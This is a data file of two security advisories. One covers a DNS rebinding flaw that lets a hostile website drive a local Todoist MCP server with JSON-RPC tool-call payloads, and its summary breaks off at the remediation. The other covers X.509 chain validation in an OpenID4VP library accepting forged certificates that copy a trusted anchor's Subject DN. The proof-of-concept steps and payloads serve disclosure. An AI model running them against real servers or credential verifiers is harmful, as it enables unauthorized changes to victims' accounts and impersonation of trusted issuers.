items.summary: The self-hosted todoist-mcp-http server accepts browser-origin MCP requests with attacker-controlled Host and Origin headers. A malicious website can use DNS rebinding to route its own origin to a victim's local 127.0.0.1 MCP server, then invoke Todoist MCP tools without a caller credential.This affects github.com/Doist/todoist-mcp at commit d2903e0d945d2a559d71c091337ad6380511e62f, package version 10.3.1, when the optional Streamable HTTP server is running. The stdio entrypoint is not browser-reachable. The vulnerable browser-reachable component is todoist-mcp-http.The documented HTTP server mode runs all MCP tools with the operator's TODOIST_API_KEY and binds to loopback by default:TODOIST_API_KEY=your-key npx -p @doist/todoist-mcp todoist-mcp-httpsrc/main-http.ts:28-30 sets the HTTP bind host and port:const PORT = Number.parseInt(process.env.PORT || '3000', 10)const HOST = process.env.HOST || '127.0.0.1'const LISTEN_HOST = normalizeListenHost(HOST)src/main-http.ts:88-99 dispatches POST /mcp to StreamableHTTPServerTransport without validating Host or Origin:app.post(    '/mcp',    requireValidTodoistToken({ type: 'static', apiKey: todoistApiKey, baseUrl }),    async (req: Request, res: Response) => {        const transport = new StreamableHTTPServerTransport({            sessionIdGenerator: undefined,        })        const server = getMcpServer({ todoistApiKey, baseUrl })        await server.connect(transport)        await transport.handleRequest(req, res, req.body)    },)src/middleware/require-valid-todoist-token.ts:105-117 validates the configured server-side Todoist token and then forwards the request. It does not authenticate the browser caller:const valid = await getValidation()if (valid) {    next()    return}src/mcp-server.ts:215-285 registers Todoist read and write tools against the server-side Todoist API client, including add-tasks, complete-tasks, update-tasks, delete-object, comments, reminders, labels, filters, goals, and assignments.Proof of conceptStart the upstream local HTTP server with an operator-owned Todoist test account:git clone https://github.com/Doist/todoist-mcp.gitcd todoist-mcpgit checkout d2903e0d945d2a559d71c091337ad6380511e62fnpm ci --ignore-scriptsnpm run buildexport TODOIST_API_KEY='<Todoist test account API token>'PORT=8082 HOST=127.0.0.1 node dist/main-http.jsThe server prints:Todoist MCP HTTP Server started on 127.0.0.1:8082MCP endpoint: http://127.0.0.1:8082/mcpFrom a browser page using DNS rebinding, route the attacker origin to 127.0.0.1:8082 and send MCP JSON-RPC requests to POST /mcp.First enumerate tools. The rebound browser session can list Todoist write tools such as add-tasks and complete-tasks.Call user-info:{  "jsonrpc": "2.0",  "id": 3,  "method": "tools/call",  "params": {    "name": "user-info",    "arguments": {}  }}Observed result: the response returns the Todoist account tied to the server-held TODOIST_API_KEY.Create a disposable task:{  "jsonrpc": "2.0",  "id": 4,  "method": "tools/call",  "params": {    "name": "add-tasks",    "arguments": {      "tasks": [        {          "content": "DNS REBINDING DEMO - attacker-created task",          "description": "Created through browser-origin DNS rebinding against local todoist-mcp-http.",          "priority": "p1",          "dueString": "today"        }      ]    }  }}Observed result: Todoist creates the task and the MCP response returns the new task ID.Complete the same task:{  "jsonrpc": "2.0",  "id": 5,  "method": "tools/call",  "params": {    "name": "complete-tasks",    "arguments": {      "ids": [        "<RETURNED_TASK_ID>"      ]    }  }}Observed result: the MCP response returns successCount: 1, and the Todoist UI shows the same task completed.demo videoImpactA public website can operate a victim's local todoist-mcp-http server when the optional HTTP transport is running. The browser does not supply a Todoist API token. The MCP server supplies its configured TODOIST_API_KEY.The demonstrated impact is Todoist task creation and completion. The same browser-origin path exposes the rest of the registered Todoist write surface, including task updates, task rescheduling, project and section changes, comments, reminders, filters, labels, goals, assignments, and object deletion.This violates the browser-origin boundary. A user can run the MCP server only on loopback and still become reachable from an unrelated public website because DNS rebinding preserves the attacker's Host and Origin while routing the TCP connection to 127.0.0.1.Why this is a vulnerabilityThe default HTTP bind target is loopback, which users reasonably treat as local-only.DNS rebinding makes loopback HTTP reachable from a public website unless the server validates Host and Origin.The MCP route does not require a per-request caller secret.The middleware validates the server's Todoist backend token, not the browser caller.Tool execution uses the server-held TODOIST_API_KEY to mutate Todoist state.RemediationAdd strict Host validation befo

items.title: [@openeudi/openid4vp] OpenID4VP: X.509 chain validation accepts a forged certificate that reuses a trusted anchor's Subject DN without verifying its signature
items.summary: SummaryChainBuilder (the private RFC 5280 validator behind TrustEvaluator and the public credential-parsing API) terminated chain building on Subject Distinguished Name string equality rather than on cryptographic closure to a trust anchor. A certificate whose Subject DN string matched a trusted anchor's Subject DN was accepted as the chain terminus with no signature verification against the anchor's public key.An attacker who mints a self-signed certificate and copies a trusted anchor's Subject DN string onto it can therefore have that certificate — and any credential signed with its private key — accepted as issued under a trusted authority.ImpactA relying party using @openeudi/openid4vp to verify OpenID4VP presentations (mdoc / SD-JWT VC) could be induced to accept a forged credential as genuine, defeating the trust-anchor model. In an eIDAS / EUDI age- or identity-verification deployment this permits impersonation of a trusted issuer.Exploitable through the public verification path: TrustEvaluator.evaluate() returns a successful result (and, due to a secondary fallback, attributes the forged leaf to a real anchor's metadata), so downstream callers see a trusted outcome.Detailssrc/trust/ChainBuilder.ts, tryBuild():while (current.subject !== anchor.subject) { /* verify & climb */ }// loop exits when current.subject === anchor.subjectreturn chain;  // returned WITHOUT verifying `current` against the anchorThe signature-verified closure path (if (!issuer) -> verifySignature(current, anchor)) is correct, but the while guard provides a second, unverified exit: when a supplied certificate (the leaf, or an attacker-supplied intermediate) has a Subject DN string equal to the anchor's, the loop body never runs, no verifySignature call is made, and the chain is returned as valid. The per-certificate checks that do run (validity, algorithm, keyUsage) all operate on the attacker-controlled certificate and do not bind it to the anchor.Secondary contributing weakness (src/trust/TrustEvaluator.ts): the anchor selected for the result was matched by serialNumber and fell back to anchors[0] when no match was found, so the forged leaf was reported alongside a genuine anchor's trustedAuthorityIds / provenance.Proof of Concept// Attacker mints a self-signed cert reusing a trusted anchor's Subject DN.const impostor = selfSigned({ subject: trustedAnchor.subject /* string */ });// Vulnerable: resolves to a valid chain [impostor] with no signature check.await new ChainBuilder().build(impostor, [trustedAnchor]);PatchChainBuilder.tryBuild() now requires the terminating certificate to be byte-identical to the trust anchor (DER rawData comparison) when the loop exits on DN equality; otherwise it throws CertificateChainError with reason: "signature". Cryptographic closure via verifySignature(current, anchor) remains the only other accepted termination. As defense-in-depth, TrustEvaluator now selects the terminating anchor by DER byte-identity and throws instead of silently falling back to the first candidate. Fixed in 0.8.1.WorkaroundsNone. Upgrade to 0.8.1.CreditsReported by Reza Shokri — Quellkern e.U. (https://augenmass.tech), GitHub @devdotbo. Thanks for the thorough report, the self-contained reproduction, and coordinated disclosure.Referenceshttps://github.com/openeudi/openid4vp/security/advisories/GHSA-4c2f-96cf-f5fchttps://nvd.nist.gov/vuln/detail/CVE-2026-75522https://github.com/openeudi/openid4vp/pull/25https://github.com/openeudi/openid4vp/commit/a3ffd435aadd61aff1f75ec4b2e1a0f44ffabf16https://github.com/openeudi/openid4vp/releases/tag/v0.8.1https://github.com/advisories/GHSA-4c2f-96cf-f5fc
